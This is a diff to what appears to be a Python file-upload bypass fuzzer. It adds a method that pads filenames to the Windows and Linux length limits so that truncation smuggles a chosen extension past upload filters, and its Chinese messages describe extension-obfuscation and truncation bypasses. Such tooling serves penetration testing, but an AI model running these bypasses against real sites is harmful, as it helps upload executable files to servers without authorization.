@@ -91,6 +91,18 @@ class General:
         fns += [filename+z for z in iis]
         return fns
 
+    def longFilename(self, suffix):
+        # 构造超长文件名
+        fns = []
+        system_length_limit = {
+            'windows': 260,
+            'linux': 255
+        }
+        length = len(suffix) - 1   # 后缀名长度
+        for x in system_length_limit:
+            f = 'a' * (system_length_limit[x] - length - 4) + '.' + suffix + '.jpg'
+            fns.append(f)
+        return fns
 
     def mimeBypass(self, ct='image/jpg'):
         '''
@@ -124,8 +136,8 @@ class General:
             filename = self.Comman.getFilename(self.args.f)
         suffix = self.getSuffix(filename)
         if suffix == False:
-            return False
-        fns = self.fuzzRareSuffix(suffix, filename)
+            return
+        fns = self.fuzzRareSuffix(suffix, filename)   # 同义后缀名替换
         if fns != []:
             print(blue('[ schedule ]') + cyan('利用不同的拓展名及文件名大小写混淆绕过'))
             for f in fns:
@@ -151,7 +163,9 @@ class General:
         else:
             file = self.args.f
             filename = self.Comman.getFilename(self.args.f)
+        suffix = self.getSuffix(filename)
         fns = self.addTruncated(filename)
+        fns += self.longFilename(suffix)
         if fns != []:
             print(blue('[ schedule ]') + cyan('尝试以特殊字符截断、系统解析漏洞截断bypass'))
             for f in fns:
